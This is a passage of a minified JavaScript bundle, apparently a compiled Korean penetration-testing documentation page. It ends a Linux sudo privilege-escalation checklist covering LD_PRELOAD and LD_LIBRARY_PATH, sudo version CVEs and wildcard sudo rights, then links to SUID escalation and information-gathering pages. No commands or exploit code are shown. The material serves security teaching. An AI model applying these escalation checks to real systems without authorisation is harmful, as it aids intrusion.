\ud3ec\ud568"]}),"\n",(0,l.jsxs)(e.li,{children:["\u2705 ",(0,l.jsx)(e.strong,{children:"\ud658\uacbd \ubcc0\uc218 \ud655\uc778"})," - LD_PRELOAD, LD_LIBRARY_PATH"]}),"\n",(0,l.jsxs)(e.li,{children:["\u2705 ",(0,l.jsx)(e.strong,{children:"CVE \ud655\uc778"})," - sudo \ubc84\uc804 \ucde8\uc57d\uc810"]}),"\n",(0,l.jsxs)(e.li,{children:["\u2705 ",(0,l.jsx)(e.strong,{children:"Wildcard \uc8fc\uc758"})," - \ud2b9\uc218 \ubb38\uc790 \ud3ec\ud568\ub41c sudo \uad8c\ud55c"]}),"\n"]}),"\n",(0,l.jsx)(e.h2,{id:"\ub2e4\uc74c-\ub2e8\uacc4",children:"\ub2e4\uc74c \ub2e8\uacc4"}),"\n",(0,l.jsxs)(e.ul,{children:["\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.strong,{children:"SUID \ud30c\uc77c \ud655\uc778"})," \u2192 ",(0,l.jsx)(e.a,{href:"/penetration/post-exploitation/linux-privesc-suid",children:"Linux Privilege Escalation - SUID"})]}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.strong,{children:"\uc815\ubcf4 \uc218\uc9d1"})," \u2192 ",(0,l.jsx)(e.a,{href:"/penetration/post-exploitation/linux-info-gathering",children:"Linux Information Gathering"})]}),"\n"]})]})}function t(n={}){const{wrapper:e}={...(0,d.R)(),...n.components};return e?(0,l.jsx)(e,{...n,children:(0,l.jsx)(h,{...n})}):h(n)}},8453:(n,e,s)=>{s.d(e,{R:()=>r,x:()=>o});var i=s(6540);const l={},d=i.createContext(l);function r(n){const e=i.useContext(d);return i.useMemo(function(){return"function"==typeof n?n(e):{...e,...n}},[e,n])}function o(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(l):n.components||l:r(n.components),i.createElement(d.Provider,{value:e},n.children)}}}]);